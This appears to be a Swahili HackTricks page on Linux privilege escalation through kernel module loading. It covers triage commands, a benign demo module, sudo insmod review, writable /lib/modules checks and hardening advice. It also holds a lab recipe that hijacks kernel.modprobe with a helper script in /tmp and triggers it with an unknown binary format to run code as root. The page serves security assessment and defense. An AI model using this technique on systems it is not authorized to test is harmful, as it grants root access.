# Unyanyasaji wa Kernel Modules na modprobe

{{#include ../../banners/hacktricks-training.md}}

## Kernel module na usanidi usio salama wa module-loading

Usaidizi wa kernel module ni eneo lenye athari kubwa wakati wa ukaguzi wa Linux privilege escalation. Usichukulie kila ujumbe wa unsigned-module kuwa exploitable peke yake, bali uutumie kujibu maswali ya kiutendaji:

- Je, mtumiaji wa sasa anaweza kupakia modules kupitia `sudo`, capabilities, au helper path inayoweza kuandikwa?
- Je, module loading bado imewezeshwa?
- Je, module signature enforcement imezimwa?
- Je, module directories au module files zinaweza kuandikwa?
- Je, kernel logs zinaweza kusomwa ili kuthibitisha kilichotokea?

Triage ya haraka:
```bash
uname -a
uname -r
cat /proc/sys/kernel/modules_disabled 2>/dev/null
cat /proc/sys/kernel/module_sig_enforce 2>/dev/null
cat /proc/sys/kernel/dmesg_restrict 2>/dev/null
dmesg 2>/dev/null | grep -Ei 'module|signature|taint|verification'
find /lib/modules/$(uname -r) -type d -writable -ls 2>/dev/null
find /lib/modules/$(uname -r) -type f -name '*.ko*' -writable -ls 2>/dev/null
```
Ufafanuzi:

- `modules_disabled=1` inamaanisha kuwa modules mpya haziwezi kupakiwa hadi mfumo uanze upya.
- `module_sig_enforce=1` kwa kawaida huzuia modules zisizo na sahihi.
- `dmesg_restrict=0` inawaruhusu users wasio na privileges kusoma kernel logs kwenye mifumo mingi.
- Paths zinazoandikika chini ya `/lib/modules/$(uname -r)/` ni hatari kwa sababu module discovery na auto-loading zinaweza kuamini tree hiyo.

### Kupakia module na kusoma kernel output

Ikiwa una ruhusa halali ya kupakia local module, `insmod` huingiza faili halisi ya `.ko` unayotoa. Module's init function huendeshwa mara moja, na messages zinazoandikwa kwa `printk()` huonekana kwenye kernel logs.

Minimal workflow kwa review au mazingira ya lab:
```bash
ls -l ./example.ko
modinfo ./example.ko 2>/dev/null
sudo insmod ./example.ko
lsmod | grep -i example
dmesg | tail -n 30
sudo rmmod example
dmesg | tail -n 30
```
Ikiwa `sudo -l` inaruhusu `insmod`, `modprobe`, au wrapper inayozunguka mojawapo yao, ichukulie kuwa critical:
```bash
sudo -l
sudo /sbin/insmod ./example.ko
```
### `insmod` iliyoruhusiwa na sudo

Sheria ya sudo inayomruhusu mtumiaji kuendesha `insmod` si sawa na kumruhusu kutumia helper wa kawaida wa kiutawala. Initialization code ya module huendeshwa katika kernel context mara tu `.ko` inapowekwa, kwa hivyo swali muhimu la review ni: "je, mtumiaji huyu anaweza kuchagua au kurekebisha module inayopakiwa?"

Mtiririko wa jumla wa review:
```bash
sudo -l
ls -l ./candidate.ko
modinfo ./candidate.ko 2>/dev/null
sudo /sbin/insmod ./candidate.ko
lsmod | grep -i candidate
dmesg | tail -n 30
sudo /sbin/rmmod candidate
```
Ikiwa mtumiaji anaweza kutoa `.ko` yoyote, kanuni hiyo inapaswa kuchukuliwa kuwa full system compromise katika authorized assessment. Kwa uendeshaji salama zaidi, epuka kuruhusu module loading kupitia sudo; ikiwa haiwezi kuepukwa, weka mipaka kwenye path halisi, ownership, permissions, signing policy, na removal workflow.

Kwa pattern salama ya kujenga module katika lab inayodhibitiwa, source na Makefile ndogo vinaweza kuonekana hivi:
```c
#include <linux/module.h>
#include <linux/kernel.h>

static int __init demo_init(void) {
printk(KERN_INFO "demo module loaded\n");
return 0;
}

static void __exit demo_exit(void) {
printk(KERN_INFO "demo module unloaded\n");
}

module_init(demo_init);
module_exit(demo_exit);
MODULE_LICENSE("GPL");
```

```makefile
obj-m += demo.o

all:
make -C /lib/modules/$(shell uname -r)/build M=$(PWD) modules

clean:
make -C /lib/modules/$(shell uname -r)/build M=$(PWD) clean
```
Tengeneza na pakia tu katika maabara iliyoidhinishwa:
```bash
make
sudo insmod demo.ko
dmesg | tail -n 20
sudo rmmod demo
```
### `kernel.modprobe` / `modprobe_path` abuse checks

`kernel.modprobe` hudhibiti userspace helper ambayo kernel huiita inapohitaji usaidizi wa kupakia modules. Ikiwa mshambulizi anaweza kuibadilisha iwe path ya executable inayoweza kuandikwa na kusababisha unknown binary format au njia nyingine ya ombi la module, inaweza kuwa root code execution.

Angalia helper ya sasa:
```bash
cat /proc/sys/kernel/modprobe 2>/dev/null
sysctl kernel.modprobe 2>/dev/null
ls -l "$(cat /proc/sys/kernel/modprobe 2>/dev/null)" 2>/dev/null
```
Angalia kama unaweza kuiathiri:
```bash
ls -l /proc/sys/kernel/modprobe
sudo -l | grep -E 'sysctl|tee|bash|sh|modprobe'
getcap -r / 2>/dev/null | grep -E 'cap_sys_admin|cap_sys_module'
```
Muundo wa jumla wa maabara pekee:
```bash
# Example only: requires permission to write kernel.modprobe
printf '#!/bin/sh\nid > /tmp/modprobe-helper-ran\n' > /tmp/helper
chmod +x /tmp/helper
echo /tmp/helper | sudo tee /proc/sys/kernel/modprobe

# Trigger an unknown executable format so the kernel attempts helper logic
printf '\\xff\\xff\\xff\\xff' > /tmp/unknown
chmod +x /tmp/unknown
/tmp/unknown 2>/dev/null || true
cat /tmp/modprobe-helper-ran 2>/dev/null
```
Kwenye mifumo iliyoimarishwa, hii inapaswa kushindwa kwa sababu watumiaji wasio na privilage hawawezi kuandika kwenye `kernel.modprobe`, njia ya helper haiwezi kuandikwa, au njia za kupakia modules zimezuiwa.

### Ukaguzi wa `/lib/modules` inayoweza kuandikwa

Mafolda ya modules yanayoweza kuandikwa yanaweza kuruhusu kubadilisha modules, kupandikiza modules hasidi, au kutumia vibaya auto-load kulingana na jinsi `modprobe` itakavyoitwa baadaye.

Kagua maeneo yanayoweza kuandikwa:
```bash
KREL="$(uname -r)"
find "/lib/modules/$KREL" -type d -writable -ls 2>/dev/null
find "/lib/modules/$KREL" -type f -name '*.ko*' -writable -ls 2>/dev/null
find "/lib/modules/$KREL" -type f \( -name 'modules.dep' -o -name 'modules.alias' -o -name 'modules.order' \) -writable -ls 2>/dev/null
```
Ukikuta maudhui ya module yanayoweza kuandikwa, chunguza jinsi modules zinavyogunduliwa:
```bash
modprobe --show-depends <module_name> 2>/dev/null
modinfo <module_name> 2>/dev/null
grep -R "<module_name>" /lib/modules/$(uname -r)/modules.* 2>/dev/null
```
Maelezo ya ulinzi:

- Weka `/lib/modules` ikiwa inamilikiwa na `root:root` na haiwezi kuandikwa na users.
- Weka `kernel.modules_disabled=1` baada ya kuwasha mfumo, inapowezekana kiutendaji.
- Tekeleza uthibitishaji wa saini za modules kwenye systems zinazohitaji modules zinazoweza kupakiwa.
- Fuatilia uandishi kwenye `/proc/sys/kernel/modprobe`, `/lib/modules`, pamoja na utekelezaji usiotarajiwa wa `insmod`/`modprobe`.

{{#include ../../banners/hacktricks-training.md}}
